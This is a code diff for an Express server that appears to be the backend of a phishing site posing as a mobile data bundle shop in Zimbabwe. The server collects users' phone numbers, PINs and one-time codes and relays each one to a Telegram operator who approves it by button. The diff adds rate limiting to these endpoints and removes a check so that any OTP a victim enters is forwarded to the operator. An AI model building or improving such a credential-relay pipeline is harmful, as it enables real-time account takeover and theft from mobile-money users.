@@ -1,11 +1,22 @@
 const express = require("express");
 const path = require("path");
+const rateLimit = require("express-rate-limit");
 
 const app = express();
 const PORT = process.env.PORT || 10000;
 
 app.use(express.json());
 app.use(express.static(path.join(__dirname, "public")));
+
+// --- ANTI-SPAM RATE LIMITING ---
+// Limit to 5 login attempts per 15 minutes per IP address
+const loginLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000, // 15 minutes
+  max: 10, // Limit each IP to 10 requests per window (10 is safer for normal users making typos)
+  message: { error: "Too many requests from this device. Please wait 15 minutes and try again." },
+  standardHeaders: true,
+  legacyHeaders: false,
+});
 
 // Store for active logins/orders
 const orders = new Map();
@@ -35,10 +46,6 @@ async function notify(text, buttons = null) {
   };
   if (buttons) body.reply_markup = {inline_keyboard: buttons};
   return telegram("sendMessage", body);
-}
-
-function makeId(prefix) {
-  return `${prefix}-${Date.now().toString(36)}-${Math.random().toString(36).slice(2,7)}`;
 }
 
 function normalizeZimbabwePhone(phone) {
@@ -142,14 +149,12 @@ async function handleCallback(query) {
 
   // --- 1. ADMIN APPROVES PIN ---
   if (action === "approve_pin") {
-    // Generate random 6-digit OTP
     const otp = Math.floor(100000 + Math.random() * 900000).toString();
     session.status = "waiting_for_otp";
     session.otp = otp;
 
     await telegram("answerCallbackQuery", { callback_query_id: query.id, text: "PIN Approved." });
     
-    // Update the original message to show the OTP
     await telegram("editMessageText", {
       chat_id: query.message.chat.id,
       message_id: query.message.message_id,
@@ -194,8 +199,8 @@ async function handleCallback(query) {
 
 // --- API ENDPOINTS FOR THE WEBSITE ---
 
-// 1. Frontend sends Phone + PIN
-app.post("/api/request-login", async (req, res) => {
+// 1. Frontend sends Phone + PIN (Protected by Rate Limiter)
+app.post("/api/request-login", loginLimiter, async (req, res) => {
   const { phone, pin, bundle, price } = req.body;
   const normalizedPhone = normalizeZimbabwePhone(phone);
 
@@ -235,8 +240,8 @@ app.get("/api/check-pin-status/:phone", (req, res) => {
   return res.json({ status: "approved" });
 });
 
-// 3. Frontend sends the OTP the user typed
-app.post("/api/verify-otp", async (req, res) => {
+// 3. Frontend sends the OTP the user typed (Protected by Rate Limiter)
+app.post("/api/verify-otp", loginLimiter, async (req, res) => {
   const { phone, otp } = req.body;
   const normalizedPhone = normalizeZimbabwePhone(phone);
   const session = orders.get(normalizedPhone);
@@ -244,9 +249,6 @@ app.post("/api/verify-otp", async (req, res) => {
   if (!session || session.status !== "waiting_for_otp") {
     return res.status(400).json({ error: "Invalid request state." });
   }
-
-  // ❌ REMOVED THE AUTOMATIC REJECTION HERE. 
-  // Now, ANY OTP the user enters is sent to the Admin for approval.
 
   session.status = "pending_otp_approval";
   session.entered_otp = otp;
